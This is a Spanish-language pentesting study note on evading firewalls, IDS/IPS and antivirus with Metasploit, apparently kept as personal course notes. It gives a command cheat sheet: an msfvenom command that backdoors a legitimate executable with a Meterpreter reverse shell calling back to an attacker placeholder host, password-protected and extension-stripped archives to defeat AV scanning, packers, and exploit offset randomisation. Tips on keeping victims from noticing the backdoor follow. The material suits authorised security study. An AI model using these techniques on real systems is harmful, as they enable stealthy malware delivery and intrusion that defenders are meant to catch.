---
tags:
  - metasploit
  - evasion
  - bypass
---

# Metasploit - Firewall & IDS-IPS Evasion

### Conceptos Clave (TL;DR)

* La protección de red se divide en Endpoint (orientada a dispositivos/servidores individuales) y Perimetral (orientada al borde de la red, separando zonas públicas, privadas y DMZ).
* Las Políticas de Seguridad dictan la existencia y flujo de tráfico/archivos mediante reglas de permitir/denegar.
* La detección de amenazas se basa principalmente en firmas (patrones de código malicioso conocidos), heurística/anomalías estadísticas (desviaciones del comportamiento base) y análisis de estado de protocolos.
* Las técnicas de evasión buscan ofuscar o cifrar la comunicación en la red (ej. AES tunnels) y evadir firmas en el disco mediante plantillas legítimas, empaquetadores (Packers) y archivos comprimidos con contraseña.

### Herramientas Clave

* [**msfconsole**](../../%F0%9F%93%81%2003_Explotacion_y_Acceso_Inicial/Using%20the%20Metasploit%20Framework/Metasploit.md): Permite mantener túneles de comunicación cifrados en AES para shells de Meterpreter, evadiendo IDS/IPS de red.
* **msfvenom**: Se utiliza para generar payloads, inyectarlos en ejecutables legítimos y comprimir/cambiar su estructura.
* **RARLabs (rar)**: Utilidad de línea de comandos para empaquetar payloads en archivos comprimidos con contraseña, interrumpiendo el análisis de firmas de los motores AV.
* **msf-virustotal**: Herramienta de escaneo para evaluar la tasa de detección de un payload contra múltiples motores AV sin salir de la consola.
* **Packers**: Software (ej. UPX, The Enigma Protector, MPRESS) diseñado para comprimir un ejecutable y ofuscar su código, descomprimiéndolo en memoria al ejecutarse.

### Metodología Paso a Paso

1. **Evasión a Nivel de Red (Túneles y Exfiltración):** Configurar las comunicaciones del C2 (ej. msfconsole) para utilizar encriptación AES en los túneles de Meterpreter, ocultando las firmas de los paquetes que viajan por la red. Si existen reglas estrictas que bloquean IPs, utilizar servicios permitidos para exfiltración o C2 (ej. túneles DNS).
2. **Ofuscación de Payload vía Plantillas (Backdooring):**    Utilizar `msfvenom` para inyectar el shellcode dentro de un instalador o programa legítimo. Se emplean múltiples iteraciones de codificadores para reducir aún más la posibilidad de detección.
3. **Ofuscación Avanzada en Disco (Compresión y Empaquetado):**    Para evadir el escaneo del archivo en disco antes de la ejecución, archivar el payload malicioso usando utilidades de compresión con contraseña. Para capas extra, realizar el proceso dos veces y remover las extensiones (.zip, .rar). Alternativamente, usar "Packers" comerciales u open-source para empaquetar el ejecutable modificado.
4. **Ejecución de Código Explotable (Desarrollo Custom):**    Al migrar o crear exploits (ej. Buffer Overflows), introducir randomización (ej. Offsets variables) y evitar los clásicos NOP sleds para no activar las firmas preconstruidas en el IDS/IPS del cliente.

### Cheat Sheet de Comandos

```bash
# Crear un payload inyectado en un ejecutable legítimo, cifrado en iteraciones y ejecutado en un hilo independiente

msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LPORT> -k -x <PATH_TO_LEGIT_EXE> -e <ENCODER_TYPE> -a x86 --platform windows -o <OUTPUT_PATH> -i <ITERATIONS>


# Descargar y extraer utilidad de compresión RAR para Linux
wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
tar -xzvf rarlinux-x64-612.tar.gz && cd rar

  
# Comprimir un payload con contraseña
rar a <ARCHIVE_NAME>.rar -p <PAYLOAD_FILE>

  
# Remover extensión de un archivo para ofuscar su naturaleza
mv <ARCHIVE_NAME>.rar <ARCHIVE_NAME>

  
# Verificar el nivel de detección de un archivo local a través de VirusTotal
msf-virustotal -k <API_KEY> -f <FILE_TO_CHECK>
```

```ruby
# Randomización de Offset en código Ruby (msfconsole module) para evadir firmas de IPS en exploits BoF

'Targets' =>

[

    [ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],

],
```

### "Gotchas" y Troubleshooting

* **El flag `-k` en msfvenom es crítico**: Al inyectar en ejecutables, este flag ejecuta el payload en un hilo separado. Si no se usa, el programa legítimo no funcionará normalmente y levantará sospechas.
* **Comportamiento visible del flag `-k`**: Si la víctima ejecuta la plantilla backdooreada desde una interfaz de línea de comandos, aparecerá una ventana de CMD adicional con el payload que no se cerrará hasta terminar la interacción de sesión.
* **Alertas por contraseñas en archivos**: Comprimir archivos con contraseña evade las firmas, pero puede generar una advertencia en el dashboard del AV por "archivo bloqueado que no puede ser escaneado". Los administradores diligentes investigarán estos archivos de forma manual.
* **Los codificadores ya no bastan**: Múltiples iteraciones de esquemas de codificación convencionales (como shikata\_ga\_nai) ya no son suficientes para evadir a la mayoría de los productos modernos; siempre deben combinarse con plantillas, packers o cifrado en memoria.
* **Testeo en entornos seguros**: Siempre se deben probar los exploits modificados y payloads ofuscados en un sandbox local o máquina virtual similar al objetivo antes de lanzarlos contra la infraestructura real.
